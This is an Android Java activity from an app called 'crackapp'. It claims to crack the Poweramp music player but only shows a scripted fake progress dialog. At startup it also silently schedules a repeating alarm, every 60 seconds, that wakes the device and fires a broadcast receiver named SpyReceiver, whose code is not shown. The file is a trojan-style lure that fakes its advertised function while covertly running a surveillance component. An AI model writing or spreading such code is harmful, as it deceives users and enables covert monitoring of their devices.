package co.undertide.crackapp.activity;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Bundle;
import android.os.SystemClock;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import co.undertide.crackapp.R;
import co.undertide.crackapp.receiver.SpyReceiver;

public class MainActivity extends AppCompatActivity {
    private TextView lastCracked;

    private Button crack;
    private ProgressDialog progressDialog;
    private String[] dialogMessages;

    boolean checkInstalled() {
        try {
            return getPackageManager().getPackageInfo("com.maxmpz.audioplayer", 0) != null;
        } catch (Exception e) {
            return false;
        }
    }

    void changeDialogMessage() {
        long totalDuration = 0;
        for (int i = 0; i < dialogMessages.length; i++) {
            final int index = i;
            long duration = (long)(Math.random() * 5000 + 500);
            crack.postDelayed(new Runnable() {
                @Override
                public void run() {
                    String s = dialogMessages[index];
                    progressDialog.setMessage(s);
                }
            }, totalDuration);
            totalDuration += duration;
        }
        crack.postDelayed(new Runnable() {
            @Override
            public void run() {
                progressDialog.setMessage("Cracking complete!");
                crack.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        progressDialog.dismiss();
                    }
                }, 3000);
            }
        }, totalDuration);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        lastCracked = (TextView)findViewById(R.id.lastCracked_TextView);
        crack = (Button)findViewById(R.id.crack_Button);

        dialogMessages = getResources().getStringArray(R.array.dialog_messages);

        crack.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if (!checkInstalled()) {
                    Toast.makeText(MainActivity.this, R.string.label_not_installed, Toast.LENGTH_LONG).show();
                    return;
                }
                progressDialog = new ProgressDialog(MainActivity.this);
                progressDialog.setTitle(R.string.dialog_title);
                progressDialog.setMessage(getString(R.string.dialog_message_initial));
                changeDialogMessage();
                progressDialog.setIndeterminate(true);
                progressDialog.setCanceledOnTouchOutside(false);
                progressDialog.setOnDismissListener(new DialogInterface.OnDismissListener() {
                    @Override
                    public void onDismiss(DialogInterface dialogInterface) {
                        Toast.makeText(MainActivity.this, R.string.dialog_success, Toast.LENGTH_LONG).show();
                    }
                });
                progressDialog.setOnCancelListener(new DialogInterface.OnCancelListener() {
                    @Override
                    public void onCancel(DialogInterface dialogInterface) {
                        Toast.makeText(MainActivity.this, R.string.dialog_cancel, Toast.LENGTH_LONG).show();
                    }
                });
                progressDialog.show();
            }
        });

        Intent intent = new Intent(this, SpyReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0, intent, 0);

        AlarmManager manager = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
        manager.setRepeating(AlarmManager.RTC_WAKEUP, SystemClock.elapsedRealtime(), 60000, pendingIntent);
    }
}
